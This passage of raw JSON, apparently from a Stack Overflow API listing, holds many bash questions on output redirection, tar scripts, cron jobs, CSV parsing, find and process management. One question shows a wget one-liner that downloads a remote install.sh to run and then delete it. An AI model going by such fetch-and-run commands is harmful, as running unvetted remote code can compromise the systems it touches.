-un\nroot\n</code></pre>\n"},{"tags":["linux","bash","logging","debian","start-stop-daemon"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12787768,"title":"How can I redirect process output from a process started with start-stop-daemon on Debian?","body":"<p>There are several questions about this already but none of them seem to work.  I have a production system that is currently down and I need to be able to get the stderr output from the daemon quickly to debug it.</p>\n\n<p>I thought I could just redirect the output from the point it is called (in an init.d script) but it is proving extremely difficult.</p>\n\n<pre><code> start-stop-daemon -d $DDIR -b -m --start --quiet -pidfile $PIDFILE --exec $DAEMON -- \\\n                $DAEMON_ARGS &gt; /var/log/daemon.log 2&gt;&amp;1 \\\n                || return 2\n</code></pre>\n\n<p>This does not work.  I tried running a shell script that calls the executable and redirects the output but still the log file remained empty (and I do know that the process is outputting information).</p>\n\n<p>Any help would be extremely appreciated.</p>\n"},{"tags":["ios","json","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12785739,"title":"text file -> json -> ios array","body":"<p>I have a file with the following format:</p>\n\n<pre><code>/Users/devplayerx/Sandbox/pics/images/001012DG-161.JPG\n  pixelWidth: 1600 \n  pixelHeight: 1050 \nfilename: 001012DG-161.JPG\n\n/Users/devplayerx/Sandbox/pics/images/001019DG-151 COPY.JPG\n  pixelWidth: 1600 \n  pixelHeight: 1050 \nfilename: 001019DG-151 COPY.JPG\n</code></pre>\n\n<p>and would like to, ultimately, have an iOS dictionary with the filename as key, and either a dictionary or array with the pixelWidth and pixelHeight as value. I was considering converting my text file into a JSON file, and then parse it using NSJSONSerialization, but I'm not sure how to convert my text file into JSON. Also, I'd like to remove the full path from the text file, since it's not needed.</p>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12785533,"title":"\"command not found\" message is redirected too","body":"<pre><code>$ foobar\nsh: foobar: not found\n$ foobar 2&gt;/dev/null\n$ \n</code></pre>\n\n<p>I'm trying to redirect only foobar's stderr (if foobar exists and can be run), but the shell's error message get redirected too. This happens in bash, ksh and sh, but not in csh. I'm not familiar with bourne shell source code, but I guess this happens because the shell first forks, then redirects, then tries exec(), and when exec() fails it sends an error message to stderr that has already been redirected.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12787853,"title":"Redirect stderr from a script WITH command that generated the error","body":"<p>I have a bash script calling multiple commands.\nI have redirected all error output using</p>\n\n<pre><code>    exec 2&gt; logfile\n</code></pre>\n\n<p>While this works, it would be nice to get the command that generated the error input to the logfile.\nAnyone got a suggestion?</p>\n"},{"tags":["bash","shell","wget"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12787501,"title":"wget and run/remove bash script in one line","body":"<pre><code>wget http://sitehere.com/install.sh -v -O install.sh; rm -rf install.sh\n</code></pre>\n\n<p>That runs the script after download right and then removes it?</p>\n"},{"tags":["linux","bash","shell","grep","preg-replace"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":59,"score":1,"question_id":12787191,"title":"Correct way to use bash to replace text in files","body":"<p>I have a config file filled with settings. Like a bunch of settings. I would like to know how to automate the replacement for example:</p>\n\n<p>I have <code>LF_ALERT_TO = \"\"</code> and I would like to add an e-mail to that.</p>\n\n<p>Question two:</p>\n\n<p>Can I use opts to to grab an e-mail for that? Example:</p>\n\n<pre><code>./run --email e.mail@here.com\n</code></pre>\n\n<p>My current code layout:</p>\n\n<pre><code>wget http://www.configserver.com/free/csf.tgz\ntar -zxvf csf.tgz\ncd csf\n./install.sh\n(modifiy values in /etc/csf/csf.conf\n</code></pre>\n"},{"tags":["bash","shell","cron","crontab"],"answer_count":10,"favorite_count":5,"up_vote_count":18,"down_vote_count":0,"view_count":14083,"score":18,"question_id":878600,"title":"How to create cronjob using bash","body":"<p>Does crontab have an argument for creating cronjobs without using the editor (crontab -e). If so, What would be the code create a cronjob from a bash script?</p>\n"},{"tags":["json","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12249147,"title":"curl response / github oauth","body":"<p>I'm trying to use OAUTH authentication for github in a bash script.</p>\n\n<p>this:</p>\n\n<pre><code>curl -u $USER_NAME --silent -d '{\"scopes\":[\"repo\"]}' \\\n    https://api.github.com/authorizations\n</code></pre>\n\n<p>works and as a result I get a response like this:</p>\n\n<pre><code>\"created_at\": \"2012-09-03T13:02:30Z\",\n\"token\": \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\n\"updated_at\": \"2012-09-03T13:02:30Z\",\n\"note_url\": null,\n\"note\": null,\n\"url\": \"https://api.github.com/authorizations/620793\",\n\"app\": {\n    \"url\": \"http://developer.github.com/v3/oauth/#oauth-authorizations-api\",\n    \"name\": \"GitHub API\"\n},\n\"id\": 620793,\n\"scopes\": [\n    \"repo\"\n]\n</code></pre>\n\n<p>But I need to keep the <code>\"token\":</code>'s value in a variable for future use. How could I do that?</p>\n"},{"tags":["bash","usb","lsusb"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12449057,"title":"USB Vendor and Product ID to Device Binding","body":"<p>I have a USB VID and PID for an attached device on GNU / Linux. <code>045e:0084</code>, for example. I want the binding so I grep the output of <code>lsusb</code> for the <code>VID:PID</code> and massage it into a format acceptable for <code>udevadm</code> lookup. Finally, I take the basename of the resultant path. Something like:</p>\n\n<pre><code>bus_dev=$(lsusb|grep VID:PID...) # Grep / Sed magic to extract bus and device from VID and PID.\npath=$(udevadm info -q path -n /dev/bus/usb/$bus_dev) # e.g., -n /dev/bus/usb/003/018\nbasename $path # e.g., /devices/pci0000:00/0000:00:14.0/usb3/3-2/3-2.3/3-2.3.1\n# e.g., yields 3-2.3.1\n</code></pre>\n\n<p>I can then use it like so:</p>\n\n<pre><code>echo 3-2.3.1|sudo tee /sys/bus/usb/drivers/usb/unbind\n</code></pre>\n\n<p>What's the preferred way to get the binding from a USB vendor and product ID?</p>\n"},{"tags":["bash","tail","gnu-coreutils"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12785404,"title":"clear screen when the file is truncated while using `tail -f`","body":"<p>I'm using <code>tail -f</code> to print the content of a continuously changing file. When the file is truncated it shows up like this:</p>\n\n<pre><code>blah (old)..\nblah more (old)..\ntail: file.out: file truncated\nblah..\nblah more..\n</code></pre>\n\n<p>This can get messy when I change the file too often so that it becomes hard to see where the file begins/ends. Is there a way to somehow <code>clear</code> the screen when the file is truncated so that it would show up like this?</p>\n\n<pre><code>tail: file.out: file truncated\nblah..\nblah more..\n</code></pre>\n"},{"tags":["python","linux","perl","bash","terminal"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12784893,"title":"iMacros-like program for terminal?","body":"<p>Is there such a program for Terminal like the iMacros plugin for Firefox, that can record what I did, then automatic do the work I have done? I hope that there is such a program to help me do the repeat work in the terminal, so any tips?  </p>\n\n<p>Regards</p>\n"},{"tags":["linux","bash","sleep","infinite"],"answer_count":4,"favorite_count":2,"up_vote_count":11,"down_vote_count":0,"view_count":2103,"score":11,"question_id":2935183,"title":"Bash: infinite sleep (infinite blocking)","body":"<p>I use <code>startx</code> to start X which will evaluate my <code>.xinitrc</code>. In my <code>.xinitrc</code> I start my window manager using <code>/usr/bin/mywm</code>. Now, if I kill my WM (in order to f.e. test some other WM), X will terminate too because the <code>.xinitrc</code> script reached EOF.\nSo I added this at the end of my <code>.xinitrc</code>:</p>\n\n<pre><code>while true; do sleep 10000; done\n</code></pre>\n\n<p>This way X won't terminate if I kill my WM. Now my question: how can I do an <strong>infinite sleep</strong> instead of looping sleep? Is there a command which will kinda like freeze the script?</p>\n\n<p>Best regards</p>\n"},{"tags":["bash","shell","cygwin","notepad++","nppexec"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":367,"score":1,"question_id":11234289,"title":"Running a bash shell script on Windows from within in Notepad++ using NppExec (and Cygwin)","body":"<p>I'm trying to reconstruct how to execute a bash shell <code>.sh</code> file on my Windows machine from within Notepad++ using NPPExec. (I've done this successfully before, but my HDD crashed and I don't recall how I did it previously.) </p>\n\n<p>When it was working before, I would run the NPPExec script that called a <code>.sh</code> file, and it showed me the console output of the .sh file processing in Notepad++ as if it were processing in cygwin.</p>\n\n<p>This is the example .sh file that I'm trying to get to work:</p>\n\n<pre><code>message=\"Testing\"\necho $message\n</code></pre>\n\n<p>This file is located in the root of C:.</p>\n\n<p><strong>Failed Attempts:</strong></p>\n\n<p>None of the following three methods work:</p>\n\n<ul>\n<li>Execute:  <code>C:\\nppexec.sh</code></li>\n</ul>\n\n<p>Response:</p>\n\n<pre><code>CreateProcess() failed with error code 193:\n%1 is not a valid Win32 application.\n</code></pre>\n\n<ul>\n<li>Execute: <code>npp_exec C:\\nppexec.sh</code></li>\n</ul>\n\n<p>Response:</p>\n\n<pre><code>message=\"Testing\"\nCreateProcess() failed with error code 2:\nThe system cannot find the file specified.    \n$message\n</code></pre>\n\n<ul>\n<li><p>Adding <code>#! /bin/bash</code> to the .sh file as the first line just causes an additional error when npp_exec is run:</p>\n\n<pre><code>NPP_EXEC: C:\\nppexec.sh\n#! /bin/bash\nCreateProcess() failed with error code 2:\nThe system cannot find the file specified.\n</code></pre></li>\n</ul>\n"},{"tags":["linux","bash","shell","csv"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":104,"score":0,"question_id":12783324,"title":"Read a CSV file in bash","body":"<p>I have a requirement to read the CSV file in shell, Well I am ok with the CSV file having single line in a cell. But if we have multiple lines in cell of CSV file then I am unable to delimit the the CSV file.</p>\n\n<pre><code>Filename            Lines\n/etc/hosts          example.test.com\n                    example2.test.com\n/etc/resolv.conf    nameserver dns.test.com\n                    search test.com\n</code></pre>\n\n<p>I will take input from the user in a CSV file and have to add the given lines to the mentioned files. Here there are multiple lines in each cell of a CSV file and If I try to cat the file it is giving in a different order.</p>\n\n<pre><code>[user2@mon ~]$ cat test2.csv\n\"Filename\",\"Lines\"\n\"/etc/hosts\",\"example.test.com\"\n,\"example2.test.com\"\n\"/etc/resolv.conf\",\"nameserver dns.test.com\"\n,\"search test.com\"\n</code></pre>\n\n<p>Is there any way we can read the multiple lines from that file and number of lines is not same in all the time.</p>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":26,"score":-2,"question_id":12783397,"title":"How to tar files to pointed folder of archive?","body":"<p>I want to write my own script for comfortable tar-usage (and also become more experienced in shell), and I am stuck. I want to if user cast <code>my_script pack name.tar file1 file2</code> - create main folder in archive in pack files to it - how to do that? </p>\n"},{"tags":["bash","shell","scripting","flume"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":173,"score":1,"question_id":10850986,"title":"Configure flume in shell/bash script - avoid interactive flume shell console","body":"<p>The normal way you configure flume is via flume master web console, way easy to talk about it here.</p>\n\n<p>OR </p>\n\n<p>via interactive flume shell console, follow the steps below:</p>\n\n<pre><code>1. $ flume shell   //this brings you to the interactive flume shell console\n2. in the interactive console,connect flume-master-node   // this connects you to flume-master\n3. in the interactive console, run \"exec unconfig your_node\"  // this unconfig all flume configuration \n4. in the interactive console, run \"exec config your_node new_config\"    // apply new flume configuration\n5. quit  // exit the the interactive console\n</code></pre>\n\n<p>So far so good.</p>\n\n<p>Then I am trying to write a bash script for my flume configuration.\nso I want to squeeze 1,2,3,4,5 into a bash and it runs automatically every time without intervention, something like this:</p>\n\n<pre><code>/usr/bin/flume shell &lt;&lt; EOF         #line1\nconnect $FLUME_MASTER               #line2\n\nexec unconfig your_node             #line3\nexec config your_node new_config    #line4\n\nquit                                #line5\n\nEOF                                 #line6\n</code></pre>\n\n<p>But everytime I run this bash script it always stops at <strong>#line1</strong> and brings me to interactive flume shell console instead of running it sliently in a non-iteractive mode. </p>\n\n<p>Does anybody know how to ignore the interactive mode and just run it sliently?</p>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12782251,"title":"shell script falls","body":"<p>I want to write my own script for comfortable tar-usage (and also become more experienced in shell) and my script falls:</p>\n\n<pre><code>cmd=$1\ntarname=$2\nfiles=${*:3}\n\necho_green(){\n   echo -e \"\\033[1;32m$@\\033[0m\"\n}\necho_blue(){\n   echo -e \"\\033[1;34m$@\\033[0m\"\n}\ncreate(){\n   echo_blue 'create'\n   case $tarname in\n      *.tar) tar -cvf $tarname $files; echo_green $tarname created;;\n      *.tar.gz) tar -cvzf $tarname $files; echo $tarname created;;\n      *.tar.bz2) tar -cvjf $tarname $files; echo_green $tarname created;;\n   esac\n}\nshow(){\n   _cmd='tar -tv'\n   case $tarname in\n      *.tar) _cmd+='f' ;;\n      *.tar.gz) _cmd+='zf' ;;\n      *.tar.bz2) _cmd+='jf' ;;\n   esac\n   _cmd_all=$_cmd\" $tarname | awk '{print \\$6}' | cut -d'/' -f 1\"\n   echo $_cmd_all\n   content=\"$($_cmd_all)\"\n   exit\n   IFS='\n'\n   _cmd_folder=$_cmd\" $tarname | head -1 | awk '{print \\$6}' | cut -d'/' -f 1\"\n   echo $_cmd_folder\n   folder=\"$($_cmd_folder)\"\n   all_in_one=1\n   for l in $content; do \n      if [ ! $l = $folder ]; then\n         all_in_one=0;\n         break;\n      fi\n   done\n   echo $all_in_one\n}\ncase $cmd in\n   \"create\") create;;\n   \"show\") show;;\nesac\n</code></pre>\n\n<p>error:</p>\n\n<pre><code>$ bash bash_lesson.sh show 4.tar \ntar -tvf 4.tar | awk '{print $6}' | cut -d'/' -f 1\ntar: You may not specify more than one `-Acdtrux' or `--test-label' option\nTry `tar --help' or `tar --usage' for more information.\n</code></pre>\n\n<p>but if I just run problematic string in console, everything is ok:</p>\n\n<pre><code>$ tar -tvf 4.tar | awk '{print $6}' | cut -d'/' -f 1\ntest_dir\nbash_lesson\n</code></pre>\n"}]}
{"total":16352,"page":13,"pagesize":100,"questions":[{"tags":["bash","recursion","command","line","options"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12740545,"title":"Need recursive BASH script to traverse folders and use wildcards","body":"<p>We have been capturing and sending files to a REST server and saving them to PNG extensions from a toolbar, now have nearly a half a million files.</p>\n\n<p>Recently we found they have been actually saving as base64 streamed files and not PNG format.</p>\n\n<p>I have a python script that can convert them but is not recursive and connot use wildcards.</p>\n\n<p>ImageMagick says the base64 files are too big(5K max) so thats out for the conversion.</p>\n\n<pre><code> IE;  /bin/base64-to-png.py &lt;base64_file_name&gt;.png &lt;output_name.png&gt;\n</code></pre>\n\n<p>The directory paths /mnt/s3/pages/ where \"pages\" has several thousand numbered folders.</p>\n\n<pre><code> IE; /mnt/s3/pages/100 \n\n   \"pages\" subfolders are never more than 1 folder deep.\n   The files are typically 5540_thumb.png, 5540_snapshot.png and 5540_crop.png \n   where the 5540 is the capture number.\n</code></pre>\n\n<p>I need a BASH script wrapper to make it recusive accross the folders, copy all originals to backup files (filename.b64) and pass wildcards as proper path/names to the python script, convert the files and leave the output file in the same respective folder then use mogrify to compress them.</p>\n\n<pre><code> IE;  base64-to-png.sh *_snapshot.b64 *_snapshot.png &lt;compression number&gt;\n\n  should\n\n    cp &lt;file_name.png&gt; &lt;file_name&gt;.b64\n    /bin/base64-to-png.py &lt;file_name.png&gt; &lt;file_name.png&gt;\n    mogrify -quality &lt;compression number&gt; -format png &lt;file_name.png&gt; \n</code></pre>\n\n<p>I have never written a script to use command line options or be recursive.  Any help is well appreciated.</p>\n\n<p>Oh, by the by; were on a Fedora Core server if that matters.</p>\n"},{"tags":["bash","table","echo"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12768907,"title":"Bash Output Tables","body":"<p>I'd like to output a table format text. What I tried to do was echo the elements of an array with '\\t' but it was misaligned.\nmy code</p>\n\n<pre><code>for((i=0;i&lt;array_size;i++));\ndo\n   echo stringarray[$i] $'\\t' numberarray[$i] $'\\t' anotherfieldarray[$i]\ndone;\n</code></pre>\n\n<p>My output</p>\n\n<pre><code>a very long string..........     112232432      anotherfield\na smaller string         123124343     anotherfield\n</code></pre>\n\n<p>Desired output</p>\n\n<pre><code>a very long string..........     112232432      anotherfield\na smaller string                 123124343      anotherfield\n</code></pre>\n"},{"tags":["python","perl","bash","shell"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":4,"view_count":97,"score":-4,"question_id":12779212,"title":"Editing the data in last column","body":"<p>I have a datafile (tab separated) which looks like this:</p>\n\n<pre><code>chr1    38045559    38046059    chr1:38045559-38046559_NM_001142726_C1orf122_+,chr1:38045559-38046559_NM_198446_C1orf122_+,chr1:38045952-38046952_NM_024640_YRDC_-\nchr1    205291045   205291545   chr1:205290545-205291545_NM_018566_YOD1_-\nchr1    1499717 1500625 chr1:1499625-1500625_NM_014188_SSU72_-\nchr1    1679941 1680441 chr1:1679441-1680441_NM_001198995_NADK_-\nchr1    1699769 1700657 chr1:1699269-1700269_NM_023018_NADK_-,chr1:1699657-1700657_NM_001198993_NADK_-\nchr1    1701368 1701868 chr1:1700868-1701868_NM_001198994_NADK_-\nchr1    1812386 1812886 chr1:1811886-1812886_NM_002074_GNB1_-\nchr1    2066155 2066655 \nchr1    2149493 2149993 chr1:2149493-2150493_NM_003036_SKI_+\nchr1    2312573 2313353 chr1:2312353-2313353_NM_024848_MORN1_-,chr1:2312573-2313573_NM_007033_RER1_+\n</code></pre>\n\n<p>Where:</p>\n\n<ul>\n<li>the first three columns are the co-ordinates and </li>\n<li>the last column contains a set of zero or more annotation records\n<ul>\n<li>each annotation record is seperated by a comma</li>\n<li>fields within the annotation record are seperated by an underscore or a colon</li>\n</ul></li>\n</ul>\n\n<p>What I want is to get the first three columns as it is and the fifth field from each annotation record. for example for row 1 the output should be something like this</p>\n\n<pre><code>chr1    38045559    38046059   C1orf122\n                               C1orf122\n                               YRDC\n</code></pre>\n\n<p>What I have done, is I have already splited my data in last column based on comma \",\" </p>\n\n<p>using <code>tr ',' '\\t' &lt;input&gt;temp1</code></p>\n\n<p>Now what I have is a file which looks like this </p>\n\n<pre><code>chr1    38045559    38046059    chr1:38045559-38046559_NM_001142726_C1orf122_+  chr1:38045559-38046559_NM_198446_C1orf122_+ chr1:38045952-38046952_NM_024640_YRDC_-\nchr1    205291045   205291545   chr1:205290545-205291545_NM_018566_YOD1_-\nchr1    1499717 1500625 chr1:1499625-1500625_NM_014188_SSU72_-\nchr1    1679941 1680441 chr1:1679441-1680441_NM_001198995_NADK_-\nchr1    1699769 1700657 chr1:1699269-1700269_NM_023018_NADK_-   chr1:1699657-1700657_NM_001198993_NADK_-\nchr1    1701368 1701868 chr1:1700868-1701868_NM_001198994_NADK_-\nchr1    1812386 1812886 chr1:1811886-1812886_NM_002074_GNB1_-\nchr1    2066155 2066655 \nchr1    2149493 2149993 chr1:2149493-2150493_NM_003036_SKI_+\nchr1    2312573 2313353 chr1:2312353-2313353_NM_024848_MORN1_-  chr1:2312573-2313573_NM_007033_RER1_+\n</code></pre>\n\n<p>Now, I need a bit of your expertise to get me to the desired output format. </p>\n\n<p>Please guide me to get the desired output in  python/perl/shell.</p>\n"},{"tags":["linux","bash","unix"],"answer_count":4,"favorite_count":33,"up_vote_count":48,"down_vote_count":0,"view_count":20652,"score":48,"question_id":692000,"title":"How do I write stderr to a file while using \"tee\" with a pipe?","body":"<p>I have the below command line argument which will print the output of aaa.sh to the screen while also writing <i>stdout</i> to bbb.out; however I would also like to write <i>stderr</i> to a file ccc.out.  Any suggestions on how to modify the below piece? Thanks!</p>\n\n<pre><code>./aaa.sh | tee ./bbb.out\n</code></pre>\n\n<p><b>Update:</b> stdout and stderr should still both be printed to the screen, regardless.</p>\n"},{"tags":["bash","shell"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":12780817,"title":"shell: list files created on sundays","body":"<p>How do I list/find all the files created on Sundays or Mondays?</p>\n\n<p>How do I use the date parameter to display them?</p>\n\n<p>Something like :  </p>\n\n<pre><code>ls -f date + %a\n</code></pre>\n\n<p>or </p>\n\n<pre><code>find -type f | date +%A\n</code></pre>\n\n<p>or</p>\n\n<pre><code>find -type f -mtime -6\n</code></pre>\n\n<p>Thanks in advance</p>\n"},{"tags":["bash","jboss7.x"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12744298,"title":"start/stop jboss 7.1 server from bash script","body":"<p>i am new to bash scripting. I know the basic commands of start/stop jboss server i.e. \"service jboss start\"/\"service jboss stop\" respectively, but i don't know how to start/stop it from bash scripting. kindly help me in resolving this problem.Thanks in advance</p>\n"},{"tags":["bash","find"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":288,"score":3,"question_id":10747039,"title":"Best GNU Find Replacement","body":"<p>I'm looking for a better find. The reason is that the find user interface is unintuitive to me (in particular, the pruning / -print style) and difficult to wrap in a function due to strict requirements on argument ordering. locate / updatedb isn't flexible enough to use instead. Would anyone care to share their example find wrappers or find alternatives (command line only, please)?</p>\n\n<p>Here's an example of what I find to be unintuitive usage:</p>\n\n<pre><code>find dir_a dir_b \\( -path dir_a/.git -o -path dir_b/out \\) -prune -o \\( -type f -o -type l \\)\n</code></pre>\n\n<p>Specifying directories before options is strange to me and the syntax for pruning is easily forgotten. (Some programs use a --exclude option instead.) I recognize this is a picky point.</p>\n\n<p>Here's my best attempt at specifying some defaults without losing much functionality:</p>\n\n<pre><code>f()\n{\n  # The trouble is that -regextype must appear after path but before expression.\n  # HACK: \"-D debugopts\" unsupported and -[HLPO] options assumed to before dirs.\n  local a=()\n  while [[ -n \"$1\" ]] &amp;&amp; ( [[ ! \"${1:0:1}\" =~ [-!(),] ]] || [[ \"${1:0:2}\" =~ -[HLPO] ]] )\n  do\n    a+=(\"$1\")\n\n    # Eliminate arg from @.\n    shift\n  done\n\n  find -O3 \"${a[@]}\" -nowarn -regextype egrep \"$@\"\n}\n</code></pre>\n\n<p>It seems silly to require a perfect understanding of all options in the program to be able to wrap it up with some defaults and not lose functionality / compatibility with plain find.</p>\n\n<p>I'm guessing I won't fine anything as standard as GNU find, but there might be something better, albeit lesser known.</p>\n"},{"tags":["linux","bash","shell","command-line"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12777522,"title":"Open a new dedicated terminal while running a command in linux","body":"<p>I want to open a new terminal when i enter a user-defined command in linux. Means for an example,when i type a command <code>tcpdump</code> in terminal and this will open a new session terminal for the tcpdump.</p>\n\n<p>So in newly opened terminal, for capturing the packet, i have to write only <code>-i eth0</code> and not <code>tcpdump -i eth0</code>. The new terminal will internally take the command <code>tcpdump</code>.</p>\n\n<p>So will these be possible?</p>\n"},{"tags":["osx","bash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":12780027,"title":"Bash upgrade on Mac OSX","body":"<p>So, I followed this tutorial here\n<a href=\"http://concisionandconcinnity.blogspot.com/2009/03/upgrade-bash-to-40-in-mac-os-x.html\" rel=\"nofollow\">http://concisionandconcinnity.blogspot.com/2009/03/upgrade-bash-to-40-in-mac-os-x.html</a>\nand it seems that it worked fine. When I type in echo $SHELL and echo $BASH_VERSION I get \"/usr/local/bin/bash\" and \"4.0.0(1)-release\" . </p>\n\n<p>But, when I simply run \"bash\" I get shells command line with \"bash-3.2$\" (not sure if this is important?) and when I try to install RVM (which is my main reason for doing the upgrade in the first place) I still get the </p>\n\n<p>BASH 3.2.25 required (you have 3.2.17(1)-release)</p>\n\n<p>error.</p>\n"},{"tags":["linux","bash","shell"],"answer_count":14,"favorite_count":43,"up_vote_count":73,"down_vote_count":0,"view_count":52909,"score":73,"question_id":392022,"title":"Best way to kill all child processes","body":"<p>I basically want to kill a whole process tree.  What is the best way to do this using any common scripting languages.  I am looking for a simple solution.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":12771909,"title":"BASH - using trap ctrl+c","body":"<p>I'm trying to execute commands inside a script using read, and when the user uses Ctrl+C, I want to stop the execution of the command, but not exit the script\nSomething like this:</p>\n\n<pre><code>#!/bin/bash\n\ninput=$1\nwhile [ \"$input\" != finish ]\ndo\n    read -t 10 input\n    trap 'continue' 2\n    bash -c \"$input\"\ndone\nunset input\n</code></pre>\n\n<p>When the user uses Ctrl+C, I want it to continue reading the input and executing other commands. The problem is that when i use a command like:\nwhile (true) do echo \"Hello!\"; done;\nit doesn't work after I type Ctrl+C one time, it works once i type Ctrl+C several times</p>\n"},{"tags":["linux","bash"],"answer_count":5,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":6038,"score":4,"question_id":2107945,"title":"How to loop over directories in Linux?","body":"<p>I an writing a script in Linux and need to go over all subdirectories names in a given directory. How can i loop these directories (and skip regular files).</p>\n\n<p>For example, the given directory is /tmp/\nand has the following subdirectories: /tmp/A, /tmp/B, /tmp/C\nI want to retrieve A,B,C.</p>\n"},{"tags":["linux","bash","parsing","variables","text-files"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":214,"score":0,"question_id":11603349,"title":"Bash: Read Variables from Text-File VAR=VALUE Format","body":"<p>I want to load some variable from a text file into my batch script.\nI tried searching but I only find tips for files like</p>\n\n<pre><code>VALUE1\nVALUE2\n...\n</code></pre>\n\n<p><strong>My</strong> TEXT-File has the following format:</p>\n\n<pre><code>VER=123\nMIN_VER=123456789\nTARGET_VER=132456790\n</code></pre>\n\n<p>And I want to be able to load this file so that I can access the three variables for matching it against a number in bash.\nHow can I achieve this?</p>\n\n<hr>\n\n<p>Answered! Thanks!</p>\n"},{"tags":["bash","shell","gawk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":545,"score":1,"question_id":1391155,"title":"using gawk in a shell script","body":"<p>Hi I want to use gawk in a for loop. Something like this: <br/></p>\n\n<pre><code>for i in gawk {print $1} | tr '\\n' ' '\ndo something using $i\n</code></pre>\n\n<p>this isn't working of course. Ideas?</p>\n"},{"tags":["linux","bash","unix","command-line"],"answer_count":7,"favorite_count":11,"up_vote_count":51,"down_vote_count":0,"view_count":12374,"score":51,"question_id":742466,"title":"How can I reverse the order of lines in a file?","body":"<p>I'd like to reverse the order of lines in a text file (or stdin), preserving the contents of each line.</p>\n\n<p>So, i.e., starting with:</p>\n\n<pre><code>foo\nbar\nbaz\n</code></pre>\n\n<p>I'd like to end up with </p>\n\n<pre><code>baz\nbar\nfoo\n</code></pre>\n\n<p>Is there a standard UNIX commandline utility for this?</p>\n"},{"tags":["bash","comparison","find"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12772230,"title":"How to use Bash to find files whose gid != a fixed uid?","body":"<p>I'm sure this is pretty basic, but I haven't figured it out yet— how would you use Bash to find all files in a directory for which the file's gid is different than its uid? I tried...</p>\n\n<pre><code>find $dir -user $uid -group !=$uid\n</code></pre>\n\n<p>...and was unsurprised when it didn't work. I haven't ventured beyond single commands with Bash yet, but maybe it's time.</p>\n"},{"tags":["linux","bash","timestamp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12773853,"title":"Append the time stamp to a file name in Ubuntu","body":"<p>I have a bash script that I use to backup the contents of a SSD every day however I use the following command in the script to name the file</p>\n\n<pre><code>zip -r ssd-$(date \"+%b_%d_%Y\").zip ../ssd\n</code></pre>\n\n<p>It already appends the month, day, and year to the file name however how can I modify that to also append the timestamp of the server onto the file name as well?</p>\n"},{"tags":["ruby-on-rails","regex","bash","shell","script"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":12772727,"title":"Writing script to populate database.yml file and need regex to identify a particular lien","body":"<p>I'm in a situation very similar to the person in <a href=\"http://stackoverflow.com/questions/5723464/sed-change-values-of-properties-of-an-environment-in-a-yml-file\">this post</a>.  I'm trying to write a script that populates values in the database.yaml file.  Problem is...I totally don't understand what's going on in that regex that was posted as the solution.</p>\n\n<p>What I want to do is pass in variables for the password.</p>\n\n<p>If I have a database yml file that looks like this:</p>\n\n<pre><code>development:\n  database: sample_development\n  password:\n  # etc...\n\ntest:\n  database: sample_test\n  password:\n  # etc...\n</code></pre>\n\n<p>then how do create a regex that finds '  password: ' so I can replace it with '  password: $new_password' ?</p>\n\n<p>For the part of the script that sets the development password, then I'm guessing the regex would begin</p>\n\n<pre><code>/^development:\n</code></pre>\n\n<p>But I'm at a loss from how to grab the next line down, ' password: '.  </p>\n\n<p>Any idea how I could do this?</p>\n"},{"tags":["ruby","bash","terminal","rvm","zsh"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":12719027,"title":"RVM set ruby default, when open new terminal erase the RVM setting, go back to system ruby","body":"<p>I just got a new MacBook Pro and tried to setup the RVM in the system. I installed RVM and set the default to </p>\n\n<p><code>\n ➜ rvm list default                                                         </p>\n\n<p>Default Ruby (for new shells)</p>\n\n<p>ruby-1.9.3-p194 [ x86_64 ]\n</code></p>\n\n<p>My RVM version is</p>\n\n<p><code>\n ➜ 